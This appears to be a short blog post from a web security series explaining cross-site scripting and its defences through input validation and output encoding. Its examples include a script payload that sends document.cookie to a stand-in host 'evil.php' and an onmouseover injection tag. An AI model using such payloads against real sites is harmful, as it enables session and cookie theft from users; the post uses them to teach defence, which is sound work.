---
layout: post
title:  Security - XSS
tags: security
---

This is the second post of a **Web Security Series**. Let's talk about the well known XSS (Cross-Site Scripting) attack.

## XSS

XSS attacks are based on script injection exploiting the echoes/output from the server in response to user input, without validation or output encoding.

```html
<form action="benign.php" method="post">
    <input type="text" name="message">
    <input type="submit" value="submit">
</form> 

<!-- output sent message -->
${message}
```

#### Example #1

Injecting a script to send cookies to a malicious site.

```html
<script>new Image().src = ‘http://evil.php/steal?' + document.cookie</script>
```

#### Example #2

Injecting a simple tag to execute random javascript.

```html
<b onmouseover=alert('Wufff!')>click me!</b>
```

## Solution

There are two well known types of XSS attacks (Stored and Reflected). Stored or persistent Xss attacks are saved/persisted in the backend and can be retrieved later for various uses. Reflected are the ones shown in the previous examples.

To address both the issues, both user **input validation** should be enforced as well as **output encoding**.

### Input Validation

We can use the framework of choice to help validate user input. We should strive for whitelisting as much as possible.

```java

// bean validation example
class Message {

@NotNull
@Pattern(regexp="[a-z]*")
@Size(min=5, max=10)
private String payload;

// getters and setters omitted
}

// controller 
@Valid Message message;
```

Couple of **Important Notes**:
* whitelist as much as possible, not blacklist.
* Avoid reflecting input back to the user (form, url, etc).

### Output Validation

Leverage the framework encoding capabilities to encode the output to prohibit writing malicious code back into the *HTML*.

```html
<!-- output sent message (jstl) -->
<c:out value="${message}"/>
```

## Caveats

**Response Header**
- X-XSS-Protection: 1; mode=block

Although modern browser use this header to validate XSS potential responses and block the output. This should not be relied upon as some browsers can disregard this instruction. 